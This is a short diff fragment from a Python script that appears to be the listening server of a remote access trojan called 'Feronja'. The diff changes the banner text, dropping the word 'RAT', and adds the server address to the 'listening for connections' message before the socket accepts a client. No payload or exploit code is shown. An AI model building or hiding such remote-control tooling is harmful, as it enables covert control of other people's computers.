@@ -19,8 +19,8 @@ print("""\033[38;5;208m
 /_/  \__/_/  \___/_//_/_/ /\_,_/ 
                      |___/       
 \033[0m""")
-print("\033[38;5;208mFeronja RAT Started!\033[0m")
-print("\033[38;5;208mServer is listening for connections...\033[0m")
+print("\033[38;5;208mFeronja Started!\033[0m")
+print(f"\033[38;5;208mServer is active and listening for connections on {server_address}...\033[0m")
 #By Achilles
 client_socket, client_address = server_socket.accept()
 #By Achilles
